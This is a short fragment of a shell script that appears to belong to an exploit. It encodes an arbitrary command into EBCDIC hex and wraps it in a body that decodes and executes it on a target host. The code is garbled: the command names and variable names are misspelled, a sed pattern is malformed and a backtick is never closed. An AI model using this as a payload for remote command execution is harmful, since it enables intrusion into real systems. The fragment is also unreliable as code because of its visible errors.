...
echo '>> go go go '
enccmd=`echo -n "$cmd"|inconv -c -f us-ascii -t ibm-1047|xxd -ps|while read l; do echo -n "$l"; done

body="l=$( echo -n \"$endcmd}\"|sed 's/\([0-9a-f\)/\\\\x\1/g'|sed 's/\\\\x25/\\\\x15/g' ); printf \$l|home/tmp exec $tgt"
